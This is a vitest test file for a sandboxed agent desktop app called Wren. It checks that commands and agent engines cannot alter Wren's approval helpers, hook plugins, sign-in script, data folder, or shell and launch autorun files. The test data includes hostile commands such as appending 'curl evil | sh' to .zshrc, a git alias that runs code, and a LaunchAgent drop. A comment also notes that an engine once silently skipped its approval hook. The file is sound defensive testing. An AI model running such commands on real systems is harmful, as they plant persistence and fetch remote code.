import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';

vi.mock('electron', () => ({ app: { getPath: () => tmpdir(), getVersion: () => '0.0.0' }, safeStorage: {} }));
const { appDirs, engineProfile, fileOpsProfile, seatbeltProfile } = await import('../src/main/sandbox');
const { listConfined, readConfined, writeConfined } = await import('../src/main/confined');

// W-128: what decides approvals (Wren's helper, Grok's per-run hook plugin) can't be changed by any agent,
// even when an allowed folder contains it. Run in the real macOS sandbox.
const sb = (profile: string, cmd: string) => spawnSync('/usr/bin/sandbox-exec', ['-p', profile, '/bin/sh', '-c', cmd], { encoding: 'utf8' });

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('trusted files in the sandbox (W-128)', () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-integrity-')));
  const project = join(root, 'project'); // an allowed folder...
  const helperDir = join(project, 'release', 'Wren.app', 'dist'); // ...that contains a build of Wren
  const data = join(root, 'data');
  const plugin = join(data, 'engines', 'grok-run1');
  mkdirSync(helperDir, { recursive: true });
  mkdirSync(join(plugin, 'hooks'), { recursive: true });
  writeFileSync(join(helperDir, 'mcp-approve.mjs'), 'original');
  writeFileSync(join(plugin, 'hooks', 'hooks.json'), 'hook');

  it("keeps Wren's helpers unwritable inside an allowed folder, for commands and engines alike", () => {
    for (const profile of [seatbeltProfile([project], data, undefined, [helperDir]), engineProfile('grok-build', [project], data, [helperDir])]) {
      expect(sb(profile, `echo x > ${join(project, 'ok.txt')}`).status).toBe(0); // the folder itself is writable
      expect(sb(profile, `echo allow-all > ${join(helperDir, 'mcp-approve.mjs')}`).status).not.toBe(0);
      expect(sb(profile, `cat ${join(helperDir, 'mcp-approve.mjs')}`).stdout).toBe('original'); // still readable
    }
    expect(readFileSync(join(helperDir, 'mcp-approve.mjs'), 'utf8')).toBe('original');
    // This app's own folders are protected even when a caller passes none (Wren's file tools).
    const own = appDirs()[0];
    expect(fileOpsProfile([own], data)).toContain(`(deny file-write* (subpath ${JSON.stringify(own)})`);
  });

  it("lets Grok read its per-run plugin, and nobody write it (another task's commands can't even read it)", () => {
    const grok = engineProfile('grok-build', [project], data, [helperDir], undefined, [plugin]);
    expect(sb(grok, `cat ${join(plugin, 'hooks', 'hooks.json')}`).stdout).toBe('hook');
    // Grok resolves the plugin path through the data folder: without lookups there it silently loaded no
    // hook, and ran writes without asking (found with grok 1.0.46).
    expect(sb(grok, `/bin/realpath ${join(plugin, 'hooks', 'hooks.json')}`).stdout.trim()).toBe(join(plugin, 'hooks', 'hooks.json'));
    expect(sb(grok, `ls ${data}`).status).not.toBe(0); // looking a path up isn't listing the data folder
    expect(sb(grok, `echo '{}' > ${join(plugin, 'hooks', 'hooks.json')}`).status).not.toBe(0);
    const command = seatbeltProfile([project], data, undefined, [helperDir]);
    expect(sb(command, `cat ${join(plugin, 'hooks', 'hooks.json')}`).stdout).toBe('');
    expect(sb(command, `echo '{}' > ${join(plugin, 'hooks', 'hooks.json')}`).status).not.toBe(0);
    expect(readFileSync(join(plugin, 'hooks', 'hooks.json'), 'utf8')).toBe('hook');
  });
});

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('the engine sign-in script Terminal runs (W-172)', () => {
  it('is out of agents\' reach, where the temp folder (its old place) is not', async () => {
    const { engineLoginScript } = await import('../src/main/login');
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-login-')));
    const project = join(root, 'project');
    const data = join(root, 'data');
    mkdirSync(project, { recursive: true });
    const { file, dir } = engineLoginScript(data, 'claude-code');
    expect(dir.startsWith(join(data, 'login') + '/')).toBe(true);
    expect(statSync(file).mode & 0o777).toBe(0o700);
    expect(readFileSync(file, 'utf8')).toMatch(/\nclaude\n$/);
    const command = seatbeltProfile([project], data);
    for (const evil of [`echo 'touch pwned' >> '${file}'`, `mv '${dir}' '${dir}.x'`, `ln -sf /tmp/x '${file}'`]) {
      expect(sb(command, evil).status, evil).not.toBe(0);
    }
    sb(command, `rm -rf '${dir}'`); // rm -f says nothing about what it may not even look at
    expect(existsSync(file)).toBe(true);
    expect(sb(command, `cat '${file}'`).stdout).toBe(''); // not even readable
    expect(readFileSync(file, 'utf8')).toMatch(/\nclaude\n$/);
    // A second script gets its own new folder.
    expect(engineLoginScript(data, 'claude-code').dir).not.toBe(dir);
    // Agents can write the temp folder, which is why the script no longer goes there.
    const temp = join(realpathSync(tmpdir()), `wren-claude-code-login-${process.pid}.command`);
    expect(sb(command, `echo x > '${temp}'`).status).toBe(0);
    rmSync(temp, { force: true });
  });
});

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('files that run programs later, outside the sandbox', () => {
  // A stand-in home folder, allowed as a whole (the case that matters); the real one is never touched.
  const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-autorun-home-')));
  const data = join(home, 'Library', 'Application Support', 'Wren');
  for (const d of ['Library/LaunchAgents', '.oh-my-zsh/custom', '.claude', '.config/git', 'project']) mkdirSync(join(home, d), { recursive: true });
  for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) writeFileSync(join(home, f), 'original');

  it("can't be changed by commands or engines, even with the whole home folder allowed; they can still be read", () => {
    for (const profile of [seatbeltProfile([home], data, home), engineProfile('grok-build', [home], data, [], home)]) {
      for (const evil of [
        `echo 'curl evil | sh' >> ${home}/.zshrc`,
        `echo x >> ${home}/.ZSHRC`,
        `echo x > ${home}/.zshrc.new && mv ${home}/.zshrc.new ${home}/.zshrc`,
        `echo x > ${home}/.bash_profile`,
        `echo x > ${home}/Library/LaunchAgents/com.evil.plist`,
        `echo x > ${home}/.oh-my-zsh/custom/evil.zsh`,
        `printf '[alias]\\n\\tst = !touch pwned' >> ${home}/.gitconfig`,
        `echo x > ${home}/.config/git/config`,
        `ln -sf /tmp/x ${home}/.profile`,
      ]) {
        expect(sb(profile, evil).status, evil).not.toBe(0);
      }
      expect(sb(profile, `echo ok > ${home}/project/file.txt`).status).toBe(0); // the rest of the home folder is still theirs
      expect(sb(profile, `cat ${home}/.zshrc`).stdout).toBe('original');
    }
    // Claude Code's settings are off limits to commands too (all of its state is).
    expect(sb(seatbeltProfile([home], data, home), `echo '{}' > ${home}/.claude/settings.json`).status).not.toBe(0);
    for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) expect(readFileSync(join(home, f), 'utf8'), f).toBe('original');
    expect(existsSync(join(home, 'Library/LaunchAgents/com.evil.plist'))).toBe(false);
  });

  it("are refused by Wren's own file tool and an engine's write", async () => {
    const saved = process.env.HOME;
    process.env.HOME = home; // homedir() follows it
    try {
      await expect(writeConfined(join(home, '.zshrc'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later outside Wren's sandbox/);
      await expect(writeConfined(join(home, 'Library', 'LaunchAgents', 'a.plist'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later/);
      await writeConfined(join(home, 'project', 'ok.txt'), Buffer.from('fine'), [home], data);
      expect(readFileSync(join(home, 'project', 'ok.txt'), 'utf8')).toBe('fine');
      const { claudeDenyRules } = await import('../src/engines/claude-code');
      const { autorunPaths } = await import('../src/main/sandbox');
      const rules = claudeDenyRules([], autorunPaths());
      expect(rules).toContain(`Edit(/${home}/.zshrc)`);
      expect(rules).toContain(`Edit(/${home}/.claude/settings.json)`);
      expect(rules.some((r) => r.startsWith('Read('))).toBe(false); // reading them is fine
    } finally {
      process.env.HOME = saved;
    }
    expect(readFileSync(join(home, '.zshrc'), 'utf8')).toBe('original');
  });
});

describe('programs Wren starts outside the sandbox (W-178)', () => {
  it('are never ones agents could have changed', async () => {
    const { agentCanWrite } = await import('../src/main/sandbox');
    const home = '/Users/someone';
    const data = `${home}/Library/Application Support/Wren`;
    const can = (p: string, roots: string[] = [`${home}/Projects`]) => agentCanWrite(p, roots, data, home);
    // Playwright's own Chromium, a bun or pnpm global install: in caches agents may write.
    expect(can(`${home}/Library/Caches/ms-playwright/chromium-1243/chrome-mac/Chromium.app/Contents/MacOS/Chromium`)).toBe(true);
    expect(can(`${home}/.bun/install/global/node_modules/@anthropic-ai/claude-code/cli.js`)).toBe(true);
    expect(can(`${home}/Library/pnpm/store/v10/files/00/abc`)).toBe(true);
    // Claude Code's and Grok Build's own installs, even when the whole home folder is allowed.
    for (const roots of [[`${home}/Projects`], [home]]) {
      expect(can(`${home}/.local/share/claude/versions/2.1.300`, roots)).toBe(false);
      expect(can(`${home}/.grok/downloads/grok-1.0.52-macos-aarch64`, roots)).toBe(false);
      expect(can(`${home}/.grok/bin/grok`, roots)).toBe(false);
      expect(can(`${data}/policy.json`, roots)).toBe(false);
    }
    // Grok's commands may still write the rest of its state (sessions, logs).
    expect(can(`${home}/.grok/sessions/x.json`)).toBe(true);
    // A program in an allowed folder (an npm global prefix under an allowed home) could be changed.
    expect(can(`${home}/.npm-global/lib/node_modules/@anthropic-ai/claude-code/cli.js`, [home])).toBe(true);
    expect(can('/opt/homebrew/lib/node_modules/@anthropic-ai/claude-code/cli.js', [home])).toBe(false);
  });

  it('refuses a program whose file is shared with another (a hard link into a package store)', async () => {
    const { untrustedProgram } = await import('../src/main/sandbox');
    const { linkSync } = await import('node:fs');
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-prog-')));
    writeFileSync(join(root, 'tool'), '#!/bin/sh\n');
    linkSync(join(root, 'tool'), join(root, 'store-copy'));
    // (In the temp folder it is agent-writable anyway; outside it, the shared file alone is enough.)
    expect(untrustedProgram(join(root, 'tool'), [], join(root, 'data'))).toMatch(/may change|shares its contents/);
    expect(untrustedProgram(join(root, 'missing'), [], join(root, 'data'))).toMatch(/can't be resolved/);
  });
});

describe("Wren's own file tool (W-128)", () => {
  it('refuses to write into Wren itself, even inside an allowed folder', async () => {
    const own = appDirs()[0];
    await expect(writeConfined(join(own, 'mcp-approve.mjs'), Buffer.from('x'), [own], mkdtempSync(join(tmpdir(), 'wren-d-')))).rejects.toThrow(/part of Wren itself/);
  });

  it("leaves Wren's own folders out of a listing of a folder that contains them", async () => {
    const own = appDirs()[0]; // src/main here
    const parent = join(own, '..');
    const listed = await listConfined(parent, 2, [parent], mkdtempSync(join(tmpdir(), 'wren-d-')));
    expect(listed.length).toBeGreaterThan(0);
    expect(listed.some((l) => l.includes(own))).toBe(false);
  });
});

// W-134: Wren's data folder (local policy, device sign-in, updates) is out of reach of its file tools on every
// platform, even when an allowed folder contains it; listings leave it out.
describe("Wren's data folder", () => {
  it('is refused to the file tools inside an allowed folder, and left out of listings', async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-home-')));
    const data = join(home, '.wren');
    mkdirSync(data);
    writeFileSync(join(data, 'policy.json'), '{"shell":false}');
    writeFileSync(join(home, 'notes.txt'), 'mine');
    await expect(writeConfined(join(data, 'policy.json'), Buffer.from('{"shell":true}'), [home], data)).rejects.toThrow(/part of Wren itself/);
    await expect(readConfined(join(data, 'policy.json'), [home], data, 1e6)).rejects.toThrow(/part of Wren itself/);
    await expect(listConfined(data, 1, [home], data)).rejects.toThrow(/part of Wren itself/);
    const listed = (await listConfined(home, 2, [home], data)).join('\n');
    expect(listed).toContain('notes.txt');
    expect(listed).not.toContain('.wren');
    expect(readFileSync(join(data, 'policy.json'), 'utf8')).toBe('{"shell":false}');
  });

  it('leaves out a data folder whose name has pattern characters, and nothing it would match as a pattern', async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-home-')));
    const data = join(home, 'd[1]*');
    mkdirSync(data);
    writeFileSync(join(data, 'policy.json'), '{}');
    mkdirSync(join(home, 'd1x')); // what `d[1]*` matches as a pattern: the user's own folder
    writeFileSync(join(home, 'd1x', 'notes.txt'), 'mine');
    const listed = (await listConfined(home, 2, [home], data)).map((l) => l.split(' ').slice(2).join(' '));
    expect(listed).toContain(join(home, 'd1x', 'notes.txt'));
    expect(listed.some((p) => p.startsWith(data))).toBe(false);
  });

  it("doesn't let Wren's own folders use up a listing's limit", async () => {
    const parent = join(appDirs()[0], '..'); // src, which holds this app's main folder (src/main here)
    const data = mkdtempSync(join(tmpdir(), 'wren-d-'));
    const all = await listConfined(parent, 2, [parent], data, 1000);
    expect(all.length).toBeGreaterThan(1);
    expect(await listConfined(parent, 2, [parent], data, all.length)).toEqual(all);
  });
});

// W-133: a development Wren (`electron .` in the repo) runs code from outside its build too: its start file,
// the node_modules it loads from, and a linked runtime module's real folder.
describe('a development build', () => {
  it("counts its package file, node_modules and runtime modules' real folders as Wren itself, not its source", () => {
    const repo = realpathSync(mkdtempSync(join(tmpdir(), 'wren-dev-')));
    const pkg = join(repo, 'apps', 'desktop');
    const store = join(repo, '.store', 'playwright-core');
    mkdirSync(join(pkg, 'dist-electron'), { recursive: true });
    mkdirSync(join(pkg, 'src'), { recursive: true });
    mkdirSync(store, { recursive: true });
    mkdirSync(join(repo, 'node_modules'));
    writeFileSync(join(pkg, 'package.json'), '{"main":"dist-electron/main.js"}');
    writeFileSync(join(store, 'package.json'), '{"name":"playwright-core"}');
    symlinkSync(store, join(repo, 'node_modules', 'playwright-core'));
    const dirs = appDirs(join(pkg, 'dist-electron'));
    for (const p of [join(pkg, 'dist-electron'), join(pkg, 'package.json'), join(repo, 'node_modules'), store]) expect(dirs).toContain(p);
    expect(dirs.some((d) => join(pkg, 'src').startsWith(d + '/') || d === join(pkg, 'src'))).toBe(false);
    // A packaged app's code is its bundle; nothing of this kind is added.
    expect(appDirs(join(repo, 'Wren.app', 'Contents', 'Resources', 'app.asar', 'dist-electron'))).not.toContain(join(repo, 'node_modules'));
  });
});
